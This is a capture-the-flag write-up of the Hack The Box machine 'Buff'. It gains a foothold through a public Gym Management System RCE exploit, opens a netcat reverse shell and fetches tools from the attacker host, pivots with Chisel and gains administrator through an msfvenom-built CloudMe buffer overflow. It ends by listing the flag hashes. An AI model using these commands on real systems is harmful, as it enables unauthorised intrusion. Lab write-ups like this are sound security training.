# CTF: Buff (HTB)

## Metadata

- **Target:** 10.129.2.18 (Windows - Buff)
    
- **Difficulty:** Easy
    
- **Date:** 2026-03-18
    
- **Key Skills/Tools:** Gym Management System 1.0 (RCE), Chisel (Reverse Port Forwarding), CloudMe 1.11.2 (Buffer Overflow), Msfvenom (Shellcode), Netcat.
    

---

## Reconnaissance

Initial enumeration was performed to identify open services and potential attack vectors on the Windows target.

Bash

```
# Full port scan
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms -oN nmap_ports.txt

# Service and script scan on discovered ports
nmap -Pn $target -sV -sC -p 7680,8080 -oN nmap_sVsC.txt
```

**Results:**

- **Port 8080:** Apache httpd 2.4.43 (Gym Management System 1.0).
    
- **Port 7680:** pando-pub.
    

---

## Foothold

The web application on port 8080 was identified as **Gym Management System 1.0**, which is vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability.

### 1. Exploitation (CVE-2020-11107)

Using the Python exploit script **48506.py** to obtain an initial web shell:

Bash

```
python2 48506.py http://10.129.2.18:8080/
```

### 2. Reverse Shell (buff\shaun)

To gain a more stable environment, `nc.exe` was transferred and executed to call back to the listener.

PowerShell

```
# Transfer netcat from attacker
curl http://10.10.14.5:8000/nc.exe -o nc.exe

# Execute reverse shell
nc.exe 10.10.14.5 8008 -e powershell.exe
```

**Listener on Kali:** `rlwrap nc -nvlp 8008`

---

## Pivoting (Chisel)

Enumeration of the user's directory revealed a **CloudMe 1.11.2** executable in `C:\Users\shaun\Downloads`. This service was running locally on port **8888** and required a tunnel to be exploited from the attacker machine.

### 1. Attacker Setup (Kali)

Bash

```
chisel server -p 8001 --reverse
```

### 2. Target Setup (10.129.2.18)

PowerShell

```
# Transfer and run chisel client
curl http://10.10.14.5:8000/chisel.exe -o chisel.exe
.\chisel.exe client 10.10.14.5:8001 R:8888:127.0.0.1:8888
```

---

## Privilege Escalation

The CloudMe service is vulnerable to a Buffer Overflow. Custom shellcode was generated to target the service through the established Chisel tunnel.

### 1. Shellcode Generation

Bash

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -b '\x00\x0A\x0D' -f python
```

### 2. Exploitation (Windows Administrator)

The generated shellcode was integrated into the CloudMe exploit (**48389.py**). After executing the exploit twice to ensure stability, a shell as **buff\administrator** was obtained.

Bash

```
python3 48389.py
```

---

## Flags

- **User (shaun):** `ec64ddda41bf6b5e02c6c6c9f7533d6e`
    
- **Root (administrator):** `d2424ef99b5729bb7ebed400552683dc`
